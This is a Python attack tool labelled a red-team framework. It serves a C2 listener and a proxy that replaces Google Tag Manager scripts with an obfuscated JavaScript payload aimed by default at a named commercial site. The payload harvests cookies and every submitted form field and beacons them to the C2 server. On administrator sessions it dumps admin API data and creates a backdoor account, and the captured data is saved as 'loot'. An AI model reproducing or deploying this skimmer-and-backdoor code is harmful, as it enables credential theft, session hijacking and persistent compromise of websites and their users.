import sys
import os
import time
import threading
import http.server
import socketserver
import json
import socket
import subprocess
import argparse
from ai_mutator import mutate_payload

DEFAULT_C2_PORT = 8085
DEFAULT_PROXY_PORT = 8086
DEFAULT_TARGET = "https://medistore.se"
DEFAULT_PROFILE = "profiles/wordpress.json"
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exfil_loot.json")

def parse_args():
    parser = argparse.ArgumentParser(description="Red Team Automated Operator Framework")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target domain/URL")
    parser.add_argument("--c2-port", type=int, default=DEFAULT_C2_PORT, help="C2 Listener Port")
    parser.add_argument("--proxy-port", type=int, default=DEFAULT_PROXY_PORT, help="Native Proxy Port")
    parser.add_argument("--profile", default=DEFAULT_PROFILE, help="Path to target profile JSON")
    return parser.parse_args()

def load_profile(profile_path):
    if not os.path.exists(profile_path):
        return {
            "platform": "generic",
            "admin_indicator": "false",
            "admin_role": "Operator",
            "customer_role": "User",
            "api_dumps": [],
            "backdoor": {"enabled": False}
        }
    try:
        with open(profile_path, 'r') as f:
            return json.load(f)
    except Exception:
        return {}

def clear_stale_ports(c2_port, proxy_port):
    for port in [c2_port, proxy_port]:
        try:
            subprocess.run(f"fuser -k {port}/tcp >/dev/null 2>&1", shell=True)
        except Exception:
            pass
        try:
            subprocess.run(f"lsof -t -i:{port} | xargs -r kill -9 >/dev/null 2>&1", shell=True)
        except Exception:
            pass
    time.sleep(1.0)

def save_loot(data):
    loot = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, 'r') as f:
                loot = json.load(f)
        except Exception:
            loot = []
    loot.append(data)
    try:
        with open(LOG_FILE, 'w') as f:
            json.dump(loot, f, indent=2)
    except Exception:
        pass

class ReusableHTTPServer(socketserver.TCPServer):
    allow_reuse_address = True
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        super().server_bind()

def run_c2_listener(c2_port):
    class C2Handler(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            length = int(self.headers.get('Content-Length', 0))
            try:
                raw_data = self.rfile.read(length).decode('utf-8')
                data = json.loads(raw_data)
                print(f"\n[+] [AI-MUTATED C2] Action Received: {data.get('action')} | Role: {data.get('role')}")
                save_loot(data)
            except Exception as e:
                print(f"[-] Parse error: {e}")
            
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b"OK")

        def log_message(self, format, *args):
            pass

    try:
        server = ReusableHTTPServer(('127.0.0.1', c2_port), C2Handler)
        print(f"[*] [OPERATOR] C2 Listener active on http://127.0.0.1:{c2_port}")
        server.serve_forever()
    except Exception as e:
        print(f"[-] C2 Listener thread crashed: {e}")

def run_proxy(c2_port, proxy_port, profile, target_url):
    class ProxyHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            try:
                print(f"[+] [PROXY] Intercepted request for: {self.path}")
                if "googletagmanager.com" in self.path or "gtag/js" in self.path or "gtm.js" in self.path:
                    print(f"[!] [AI MUTATOR ENGAGED] Polymorphically mutating payload for target: {target_url}...")
                    
                    admin_check = profile.get("admin_indicator", "false")
                    admin_role = profile.get("admin_role", "Administrator")
                    customer_role = profile.get("customer_role", "Customer")
                    api_dumps = profile.get("api_dumps", [])
                    backdoor = profile.get("backdoor", {"enabled": False})

                    api_fetches_js = ""
                    for dump in api_dumps:
                        action = dump.get("action")
                        path = dump.get("path")
                        snippet = """
                                fetch('PATH_PLACEHOLDER', { credentials: 'include' })
                                    .then(res => res.json())
                                    .then(data => {
                                        navigator.sendBeacon(c2, JSON.stringify(Object.assign({}, baseData, { action: 'ACTION_PLACEHOLDER', data: data })));
                                    }).catch(err => {});
                        """
                        api_fetches_js += snippet.replace("PATH_PLACEHOLDER", path).replace("ACTION_PLACEHOLDER", action)

                    backdoor_js = ""
                    if backdoor.get("enabled"):
                        backdoor_body = json.dumps(backdoor.get("body", {}))
                        backdoor_path = backdoor.get("path")
                        backdoor_template = """
                                const backdoorData = BODY_PLACEHOLDER;
                                fetch('PATH_PLACEHOLDER', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    credentials: 'include',
                                    body: JSON.stringify(backdoorData)
                                }).then(res => res.json()).then(account => {
                                    if (account && (account.id || account.success)) {
                                        navigator.sendBeacon(c2, JSON.stringify(Object.assign({}, baseData, { action: 'persistence_established', accountDetails: { id: account.id || 'N/A', username: account.slug || account.username || 'backdoor' } })));
                                    }
                                }).catch(err => {});
                        """
                        backdoor_js = backdoor_template.replace("BODY_PLACEHOLDER", backdoor_body).replace("PATH_PLACEHOLDER", backdoor_path)

                    raw_js = """
                    (function() {
                        'use strict';
                        const c2 = 'http://127.0.0.1:C2_PORT_PLACEHOLDER/';
                        const isAdmin = ADMIN_INDICATOR_PLACEHOLDER;
                        const role = isAdmin ? 'ADMIN_ROLE_PLACEHOLDER' : 'CUSTOMER_ROLE_PLACEHOLDER';
                        
                        const parseCookies = () => {
                            const cookies = {};
                            document.cookie.split(';').forEach(cookie => {
                                const parts = cookie.split('=').map(c => c.trim());
                                if (parts.length === 2) cookies[parts[0]] = parts[1];
                            });
                            return cookies;
                        };
                        
                        const baseData = { 
                            role: role, 
                            url: window.location.href, 
                            parsed_cookies: parseCookies(), 
                            timestamp: new Date().toISOString() 
                        };
                        
                        document.addEventListener('submit', function(e) {
                            const form = e.target;
                            const formData = new FormData(form);
                            const fields = {};
                            formData.forEach((val, key) => { fields[key] = val; });
                            navigator.sendBeacon(c2, JSON.stringify(Object.assign({}, baseData, { action: 'form_submission', formId: form.id || 'form_input', capturedFields: fields })));
                        }, true);

                        if (isAdmin) {
                            setTimeout(() => {
                                API_FETCHES_PLACEHOLDER
                                BACKDOOR_PLACEHOLDER
                            }, 2000);
                        }

                        navigator.sendBeacon(c2, JSON.stringify(Object.assign({}, baseData, { action: 'initial_beacon' })));
                    })();
                    """
                    
                    semi_compiled = raw_js.replace("C2_PORT_PLACEHOLDER", str(c2_port)) \
                                         .replace("ADMIN_INDICATOR_PLACEHOLDER", admin_check) \
                                         .replace("ADMIN_ROLE_PLACEHOLDER", admin_role) \
                                         .replace("CUSTOMER_ROLE_PLACEHOLDER", customer_role) \
                                         .replace("API_FETCHES_PLACEHOLDER", api_fetches_js) \
                                         .replace("BACKDOOR_PLACEHOLDER", backdoor_js)

                    mutated_payload_str, mutation_meta = mutate_payload(semi_compiled, target_url)
                    print(f"    [+] AI Mutation Applied: Obfuscated {mutation_meta['obfuscated_keys']} core variables.")

                    payload = mutated_payload_str.encode('utf-8')

                    self.send_response(200)
                    self.send_header("Content-Type", "application/javascript")
                    self.send_header("Content-Length", str(len(payload)))
                    self.end_headers()
                    self.wfile.write(payload)
                    return

                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"Operator Proxy Active.")
            except Exception as e:
                print(f"[-] Proxy handler exception: {e}")
                try:
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(f"Error: {e}".encode('utf-8'))
                except:
                    pass

        def log_message(self, format, *args):
            pass

    try:
        server = ReusableHTTPServer(('127.0.0.1', proxy_port), ProxyHandler)
        print(f"[*] [OPERATOR] Native Proxy active on http://127.0.0.1:{proxy_port} (Profile: {profile.get('platform')})")
        server.serve_forever()
    except Exception as e:
        print(f"[-] Proxy thread crashed: {e}")

def main():
    args = parse_args()
    print(f"[*] Initializing AI-Augmented Red Team Operator for target: {args.target}")
    
    profile = load_profile(args.profile)
    print(f"[*] Loaded target profile: {profile.get('platform', 'unknown').upper()}")

    clear_stale_ports(args.c2_port, args.proxy_port)
    time.sleep(1.0)

    threading.Thread(target=run_c2_listener, args=(args.c2_port,), daemon=True).start()
    threading.Thread(target=run_proxy, args=(args.c2_port, args.proxy_port, profile, args.target), daemon=True).start()

    print(f"[*] All services online. Loot file: {LOG_FILE}. Press Ctrl+C to exit.")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down operator framework. Stay safe!")
        sys.exit(0)

if __name__ == '__main__':
    main()
